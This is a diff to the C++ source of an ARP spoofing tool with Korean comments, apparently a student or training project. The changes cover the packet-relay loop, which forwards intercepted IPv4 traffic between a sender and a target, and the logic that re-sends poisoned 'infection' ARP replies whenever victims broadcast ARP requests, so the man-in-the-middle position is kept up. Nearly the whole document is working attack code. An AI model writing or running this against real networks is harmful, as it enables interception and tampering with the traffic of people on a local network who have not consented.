@@ -25,7 +25,7 @@
 #include "common-threads.h"
 #define SUCCESS 1
 #define FAIL -1
-#define INFINITY 1 << 10
+#define DEBUG 1
 
 
 #pragma pack(push, 1) 
@@ -247,7 +247,7 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
 	// relay용
-	u_char paste_packet[10000];
+	u_char paste_packet[10000]; // 동적할당으로 수정 ㄱㄱ
 
 	while (exit_flag) {
 	
@@ -268,20 +268,36 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 		if(ethHeader.type_ == htons(EthHdr::Ip4)) {
 			//cout << string(header.eth_.smac_) << ' ' << string(header.eth_.dmac_) << endl;
 			// flow를 해야하는지 확인
+
+			// IP헤더에서 sip랑 dip만 필요함.
+			Ip sip, dip;
+			
+			memcpy(&sip, &packet[14+12], 4);
+			memcpy(&dip, &packet[14+16], 4);
+
+
+			// flow하는 것은
+			// smac은 sender
+			// dmac은 나 
+			// dip는 target => 외부일거임
+			// 만약에 ip도착지가 나이면 relay할 필요 없음.
+
+
+
 			for(auto i : IpTable) {
-				// sender 확인
-				if(ethHeader.smac_ == ARPtable.find(i.first)->second) {
-					
+				// smac이 sender인지
+				if(ethHeader.smac_ == ARPtable[i.first] && ethHeader.dmac_ == ARPtable[me]) {
+					//cout << "진입" << endl;
 					if(pkheader->len >= 10000) {
 						cout << "length 초과" << endl;
 						continue;
 					}
 
 					
-					
 					// case 1: 내 자신(본인이 target일 경우)한테 오는 패킷을 나한테 또 전달할 필요는 없음.
 					// continue하면 될듯
-					if(i.second == me) continue;
+					//if(i.second == me) continue; // 내가 target
+					//if(htonl(dip) == me) continue; // 패킷 dest ip가 나
 					
 					// case 2: {sender, target}의 중복
 					// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.7 192.168.0.1 192.168.0.7
@@ -297,10 +313,17 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 					// case 5: sender가 me인 경우
 					// 본인이 이미 감염되어 있기 때문에 패킷을 target한테 보냄.
 					// relay할 필요가 없음.
-					if(i.first == me) continue;
+					// ???
+					//if(i.first == me) continue;
 
 					// case 6: 
-					// ex) 
+					// ex)  /arp-spoof A B B A A C C A
+					/*
+
+					패킷 relay는
+					A <-> me <-> B(gateway)
+					A <-> me <-> C(user) // 이러면 ip로 판단해야할듯
+					*/
 
 
 					// relay할 때는
@@ -373,13 +396,13 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 				// 1. sender의 target에 대한 broadcast
 				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].first) && ntohl(header.arp_.tip_) == uint32_t(IpTable[i].second)) {
 					cout << "case 1" << endl;
-					sendARP(infectionPacket[i], handle, 3, 500);
+					sendARP(infectionPacket[i], handle, 2, 500);
 				}
 
 				// 2. target의 broadcast
 				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].second)) {
 					cout << "case 2" << endl;
-					sendARP(infectionPacket[i], handle, 3, 500);
+					sendARP(infectionPacket[i], handle, 2, 500);
 				}
 			}
 
@@ -390,7 +413,7 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 				// 3. sender -> target unicast
 				if(header.arp_.sip_ == IpTable[i].first && header.arp_.tip_ == IpTable[i].second) {
 					cout << "case 3" << endl;
-					sendARP(infectionPacket[i], handle, 3, 500);
+					sendARP(infectionPacket[i], handle, 2, 500);
 				}
 			}
 			
